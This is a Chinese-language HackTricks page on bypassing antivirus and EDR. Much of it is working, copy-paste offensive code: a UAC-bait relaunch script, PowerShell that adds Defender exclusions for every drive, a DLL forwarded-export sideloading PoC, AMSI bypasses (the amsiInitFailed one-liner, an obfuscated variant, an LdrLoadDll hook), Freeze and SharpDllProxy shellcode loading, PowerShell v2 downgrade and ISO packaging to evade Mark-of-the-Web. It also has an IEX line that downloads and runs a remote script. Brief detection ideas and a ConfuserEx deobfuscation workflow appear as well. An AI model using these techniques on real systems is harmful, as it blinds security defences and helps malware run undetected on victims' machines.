# 防病毒 (AV) 绕过

{{#include ../banners/hacktricks-training.md}}

**本页作者** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## 停用 Defender

- [defendnot](https://github.com/es3n1n/defendnot): 用于停止 Windows Defender 运行的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 通过伪装成另一个 AV 来停止 Windows Defender 运行的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### 在修改 Defender 之前的安装程序式 UAC 诱饵

伪装成游戏作弊的公共 loader 通常以未签名的 Node.js/Nexe 安装程序发布，它们会先**请求用户提升权限**，随后才使 Defender 失效。流程很简单：

1. 使用 `net session` 探测是否在管理员上下文中。该命令只有在调用者拥有管理员权限时才会成功，所以如果失败则表示 loader 正在以标准用户身份运行。
2. 立即使用 `RunAs` verb 重新启动自身以触发预期的 UAC 同意提示，同时保留原始命令行。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
受害者通常认为他们正在安装 “cracked” 软件，所以提示通常会被接受，赋予恶意软件更改 Defender 策略所需的权限。

### 为每个驱动器字母设置全面的 `MpPreference` 排除项

一旦提权，GachiLoader-style 链条会尽可能扩大 Defender 的盲区，而不是直接禁用服务。加载器首先终止 GUI 监视程序 (`taskkill /F /IM SecHealthUI.exe`)，然后推送 **极其宽泛的排除项**，使每个用户配置文件、系统目录和可移动磁盘都无法被扫描：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
关键观察：

- 循环会遍历每个已挂载的文件系统（D:\、E:\、USB 盘等），所以 **以后在磁盘任何位置放置的 payload 都会被忽略**。
- `.sys` 扩展名的排除是面向未来的——攻击者保留以后加载未签名驱动的选项，而无需再次接触 Defender。
- 所有更改都落在 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 下，允许后续阶段确认这些排除是否持续存在或在不重新触发 UAC 的情况下扩展它们。

因为没有任何 Defender 服务被停止，简单的健康检查会继续报告“antivirus active”，尽管实时检测从未触及那些路径。

## **AV Evasion Methodology**

目前，AV 会使用不同的方法来判断文件是否恶意：静态检测、动态分析，以及对于更高级的 EDRs，会有行为分析。

### **Static detection**

静态检测通过标记二进制或脚本中已知的恶意字符串或字节数组来实现，也会从文件本身提取信息（例如文件描述、公司名、数字签名、图标、校验和等）。这意味着使用已知的公开工具可能更容易被抓住，因为它们很可能已经被分析并被标记为恶意。有几种方法可以绕过这类检测：

- **Encryption**

如果你加密二进制文件，AV 就无法检测到你的程序，但你需要某种 loader 在内存中解密并运行程序。

- **Obfuscation**

有时你只需要更改二进制或脚本中的一些字符串就能绕过 AV，但这可能是个耗时的任务，取决于你要混淆的内容。

- **Custom tooling**

如果你开发自己的工具，就不会有已知的恶意签名，但这需要大量时间和精力。

> [!TIP]
> 一种检测 Windows Defender 静态检测的好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件拆分成多个片段，然后让 Defender 分别扫描每个片段，这样可以确切告诉你二进制中被标记的字符串或字节是什么。

强烈建议查看这个 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) 关于实战 AV 绕过的内容。

### **Dynamic analysis**

动态分析是指 AV 在沙箱中运行你的二进制并观察是否有恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这一部分可能更难对付，但你可以通过以下方法来规避沙箱。

- **Sleep before execution** 根据实现方式不同，这可能是绕过 AV 动态分析的好方法。AV 的扫描时间通常非常短以免打断用户工作流，所以使用长时间的 sleep 可以扰乱二进制的分析。但问题是许多 AV 的沙箱可能会根据实现方式跳过 sleep。
- **Checking machine's resources** 通常沙箱可用的资源很少（例如 < 2GB RAM），否则会拖慢用户机器。你也可以在这里发挥创意，例如检查 CPU 温度或风扇转速，并非所有这些都会在沙箱中实现。
- **Machine-specific checks** 如果你想针对加入了 "contoso.local" 域的用户工作站，可以检查计算机的域是否与指定的匹配；如果不匹配，你可以让程序退出。

事实证明 Microsoft Defender 的 Sandbox 计算机名是 HAL9TH，所以你可以在触发之前在你的 malware 中检查计算机名；如果名字匹配 HAL9TH，就表示你处于 Defender 的沙箱中，你可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

以下是来自 [@mgeeky](https://twitter.com/mariuszbit) 关于对抗沙箱的一些非常好的建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

正如我们在本文前面所说，**公开工具**最终会被**检测到**，所以你应该自问一件事：

例如，如果你想要转储 LSASS，**你真的需要使用 mimikatz 吗**？或者你可以使用一个更少人知晓、同样能转储 LSASS 的项目？

正确的答案很可能是后者。以 mimikatz 为例，它可能是被 AV 和 EDR 标记最多的软件之一，尽管该项目本身非常酷，但要用它来绕过 AV 是一场噩梦，所以寻找替代方案来实现你的目标更为明智。

> [!TIP]
> 在为绕过而修改 payload 时，确保在 defender 中**关闭自动样本提交**，并且请务必、认真地**DO NOT UPLOAD TO VIRUSTOTAL**。如果你想检查某个 payload 是否会被特定 AV 检测到，先在 VM 上安装该 AV，尝试关闭自动样本提交，在那里进行测试直到满意为止。

## EXEs vs DLLs

只要可能，总是**优先使用 DLL 来进行绕过**。根据我的经验，DLL 文件通常**被检测的可能性要低得多**并且分析得更少，所以这是在某些情况下避免检测的一个非常简单的技巧（当然前提是你的 payload 有办法作为 DLL 运行）。

正如这张图所示，Havoc 的一个 DLL Payload 在 antiscan.me 上的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

下面我们将展示一些你可以在 DLL 文件上使用的技巧，使其更具隐蔽性。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用了 loader 使用的 DLL 搜索顺序，通过将受害应用和恶意 payload 放置在一起实现。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和下面的 powershell 脚本来检查易受 DLL Sideloading 影响的程序：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
该命令将输出位于 "C:\Program Files\\" 中易受 DLL hijacking 的程序列表以及它们尝试加载的 DLL 文件。

我强烈建议你 **explore DLL Hijackable/Sideloadable programs yourself**，如果正确使用这种技术可以相当隐蔽，但如果使用公开已知的 DLL Sideloadable 程序，可能很容易被发现。

仅仅放置一个程序期望加载名称相同的恶意 DLL 并不会直接执行你的 payload，因为程序期望该 DLL 内包含某些特定函数。为了解决这个问题，我们将使用另一种技术，称为 **DLL Proxying/Forwarding**。

**DLL Proxying** 将程序对代理（恶意）DLL 的调用转发到原始 DLL，从而保留程序的功能并能够处理你的 payload 的执行。

我将使用来自 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)

These are the steps I followed:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们 2 个文件：一个 DLL 源代码模板，以及被重命名的原始 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) 和 proxy DLL 在 [antiscan.me](https://antiscan.me) 的检测率都是 0/26！我会称之为一次成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我 **强烈建议** 你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading，并且也观看 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) 以更深入地了解我们讨论的内容。

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE 模块可以导出实际上是 “forwarders” 的函数：导出项不是指向代码，而是包含形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows loader 将会：

- 如果未加载，则加载 `TargetDll`
- 从中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，它将从受保护的 KnownDLLs 命名空间中提供（例如 ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL 搜索顺序，其中包括执行转发解析的模块所在目录。

这就启用了一个间接的 sideloading 原语：找到一个签名的 DLL，它导出一个被转发到非 KnownDLL 模块名的函数，然后将该签名 DLL 与一个名称与转发目标模块完全相同的攻击者控制的 DLL 放在同一目录。当调用转发导出时，加载器会解析转发并从同一目录加载你的 DLL，执行你的 DllMain。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此它会按照普通搜索顺序解析。

PoC (copy-paste):
1) 将签名的系统 DLL 复制到一个可写的文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在相同文件夹中放置一个恶意的 `NCRYPTPROV.dll`。一个最小的 `DllMain` 就足以获取代码执行；你不需要实现被转发的函数来触发 `DllMain`。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发 forward:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（已签名）加载并列（side-by-side）`keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会跟随转发到 `NCRYPTPROV.SetAuditingInterface`
- 随后加载器从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，你只有在 `DllMain` 已经运行后才会看到 "missing API" 错误

Hunting tips:
- 重点关注那些转发导出（forwarded exports），其目标模块不是 KnownDLL。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用如下工具枚举转发导出：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项：https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- 监控 LOLBins（例如 rundll32.exe）从非系统路径加载已签名的 DLL，随后又从该目录加载具有相同基名的 non-KnownDLLs
- 对进程/模块链发出警报，例如： `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`（在用户可写路径下）
- 强制执行代码完整性策略（WDAC/AppLocker），并在应用程序目录中禁止写入+执行权限

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is just a cat & mouse game, what works today could be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.

## AMSI (Anti-Malware Scan Interface)

AMSI 的创建是为了防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"。最初，AV 只能扫描磁盘上的文件，所以如果你能以某种方式直接在内存中执行 payload，AV 就无法阻止它，因为可见性不足。

AMSI 功能集成在 Windows 的以下组件中。

- User Account Control, or UAC（对 EXE、COM、MSI 或 ActiveX 安装的提升）
- PowerShell（脚本、交互使用和动态代码评估）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA macros

它允许杀软通过以未加密且未混淆的形式暴露脚本内容来检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 上触发如下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是脚本运行的可执行文件路径，在这个例子中是 powershell.exe

我们没有将任何文件写入磁盘，但仍然因为 AMSI 在内存中被拦截。

此外，从 **.NET 4.8** 开始，C# 代码也会通过 AMSI 运行。这甚至影响 `Assembly.Load(byte[])` 用于内存中加载执行。因此，如果你想规避 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低）进行内存执行。

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此，修改你尝试加载的脚本可能是规避检测的一个好方法。

然而，AMSI 具有对脚本进行去混淆的能力，即使脚本有多层混淆，因此混淆的效果取决于具体实现，有时可能不是一个好选项。这使得规避并不那么直接。尽管如此，有时你只需要改几个变量名就能通过，所以视被标记的程度而定。

- **AMSI Bypass**

由于 AMSI 是通过向 powershell（以及 cscript.exe、wscript.exe 等）进程加载一个 DLL 来实现的，即使以非特权用户身份运行，也有可能对其进行篡改。由于 AMSI 实现上的这个缺陷，研究人员发现了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制使 AMSI 初始化失败（amsiInitFailed）将导致当前进程不再启动扫描。最初这是由 [Matt Graeber](https://twitter.com/mattifestation) 披露的，Microsoft 已经开发了相应的签名以防止其被广泛使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 powershell 代码就能使当前 powershell 进程中的 AMSI 无法使用。 这行代码当然会被 AMSI 本身标记，所以需要做一些修改才能使用该技术。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 取得并修改的 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请注意，一旦这篇文章发布，很可能会被标记，因此如果你的目的是保持不被发现，就不要发布任何代码。

Memory Patching

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的解释。

There are also many other techniques used to bypass AMSI with powershell, check out [**此页面**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**此仓库**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### 通过阻止 amsi.dll 加载来禁用 AMSI（LdrLoadDll hook）

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注意
- 在 PowerShell、WScript/CScript 及自定义加载器上均有效（任何会加载 AMSI 的场景）。
- 将其与通过 stdin 输送脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`）配合使用，以避免长命令行痕迹。
- 已见用于通过 LOLBins 执行的加载器（例如，`regsvr32` 调用 `DllRegisterServer`）。

该工具 [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) 也会生成用于绕过 AMSI 的脚本。

**移除被检测到的签名**

你可以使用如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 这样的工具，从当前进程的内存中移除检测到的 AMSI 签名。该工具通过扫描当前进程内存以查找 AMSI 签名，然后用 NOP 指令覆盖它，从而在内存中有效移除该签名。

**使用 AMSI 的 AV/EDR 产品**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**使用 PowerShell 版本 2**
如果使用 PowerShell 版本 2，AMSI 不会被加载，因此可以在不被 AMSI 扫描的情况下运行脚本。你可以这样做：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一项功能，允许记录系统上执行的所有 PowerShell 命令。它对审计和故障排查很有用，但对想要规避检测的攻击者来说也是一个**问题**。

要绕过 PowerShell logging，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**：可以使用像 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 这样的工具来实现。
- **Use Powershell version 2**：如果使用 PowerShell version 2，AMSI 将不会被加载，因此可以运行脚本而不被 AMSI 扫描。可执行：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来创建一个没有防护的 powershell 会话（这也是 `powerpick` 从 Cobal Strike 使用的方式）。


## Obfuscation

> [!TIP]
> 许多混淆技术依赖于对数据加密，这会增加二进制文件的熵，使 AVs 和 EDRs 更容易检测到它。对此要小心，或许仅对代码中敏感或需要隐藏的特定部分应用加密。

### Deobfuscating ConfuserEx-Protected .NET Binaries

当分析使用 ConfuserEx 2（或商业分支）的恶意软件时，常会遇到多层保护，这些保护会阻止反编译器和沙箱。下面的工作流程可以可靠地**恢复接近原始的 IL**，随后可在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1.  Anti-tampering removal – ConfuserEx 会对每个 *method body* 进行加密，并在 *module* 的静态构造函数（`<Module>.cctor`）内解密。这也会修补 PE 校验和，所以任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 定位被加密的元数据表，恢复 XOR 密钥并重写为干净的程序集：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个反篡改参数（`key0-key3`, `nameHash`, `internKey`），在构建自定义 unpacker 时可能有用。

2.  Symbol / control-flow recovery – 将 *clean* 文件交给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – 选择 ConfuserEx 2 配置  
• de4dot 会撤销控制流扁平化，恢复原始命名空间、类和变量名，并解密常量字符串。

3.  Proxy-call stripping – ConfuserEx 用轻量级包装器（即 *proxy calls*）替换直接的方法调用以进一步破坏反编译。使用 **ProxyCall-Remover** 将其移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，你应该能看到常见的 .NET API，如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的包装函数（`Class8.smethod_10`，…）。

4.  Manual clean-up – 在 dnSpy 中打开处理后的二进制，搜索大型 Base64 段或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用，以定位*真实*载荷。恶意软件通常将其作为 TLV 编码的字节数组，初始化在 `<Module>.byte_0` 中。

上述流程可在**不需要运行恶意样本**的情况下恢复执行流——在离线工作站上分析时非常有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可作为 IOC 用于自动分流样本。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供一个 [LLVM](http://www.llvm.org/) 编译套件的开源分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提高软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 在编译时生成混淆代码，无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 通过 C++ template metaprogramming framework 生成一层混淆操作，使想要 crack 应用程序的人更加困难。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够对各种 pe files（如 .exe、.dll、.sys）进行混淆。
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个针对任意可执行文件的简单 metamorphic code 引擎。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个针对 LLVM-supported languages 的细粒度 code obfuscation 框架，使用 ROP (return-oriented programming)。ROPfuscator 通过将普通指令转换为 ROP chains 在汇编级别对程序进行混淆，破坏我们对正常控制流的直观理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能将现有的 EXE/DLL 转换为 shellcode 并加载它们

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 需要注意的是，被 **trusted** 签名证书签署的可执行文件 **不会触发 SmartScreen**。

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器中以规避 Mark-of-the-Web 的工具。

示例用法:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的记录机制，允许应用和系统组件**记录事件**。但是，它也可以被安全产品用来监控并检测恶意活动。

类似于 AMSI 被禁用（绕过）的方式，也可以让用户态进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。实现方法是在内存中修补该函数使其立即返回，从而对该进程有效地禁用 ETW 日志。

更多信息见 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**。


## C# Assembly Reflection

将 C# 二进制直接加载到内存中已经存在相当长时间，并且仍然是运行 post-exploitation 工具而不被 AV 捕获的很好方式。

因为 payload 会直接加载到内存而不接触磁盘，我们只需担心为整个进程修补 AMSI。

大多数 C2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# assemblies 的能力，但有不同的方法来实现这一点：

- **Fork\&Run**

它涉及到**生成一个新的牺牲进程**，将你的 post-exploitation 恶意代码注入该进程，执行你的恶意代码，完成后终止该进程。这既有优点也有缺点。Fork and run 方法的优点是执行发生在我们的 Beacon implant 进程的**外部**。这意味着如果我们的 post-exploitation 操作出现问题或被发现，我们的 **implant 更有可能幸存。** 缺点是被 **Behavioural Detections** 捕获的**概率更高**。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

即将 post-exploitation 恶意代码注入**到自身进程**。这样可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 执行出现问题，**丢失你的 beacon** 的概率会大大增加，因为进程可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 想了解更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）

你也可以通过 PowerShell 加载 C# Assemblies，参见 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 以及 [S3cur3th1sSh1t 的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 所示，可以通过让被攻陷主机访问**安装在攻击者控制的 SMB share 上的解释器环境**，使用其他语言来执行恶意代码。

通过允许访问 SMB 共享上的解释器二进制和环境，你可以在被攻陷主机的内存中**以这些语言执行任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过使用 Go、Java、PHP 等，我们在**绕过静态签名**方面具有更大的灵活性。使用这些语言的随机未混淆 reverse shell 脚本进行测试已被证明是成功的。

## TokenStomping

Token stomping 是一种允许攻击者**操纵访问令牌或诸如 EDR 或 AV 之类的安全产品的权限**的技术，使其权限降低，从而该进程不会死亡，但没有权限去检查恶意活动。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程的令牌句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
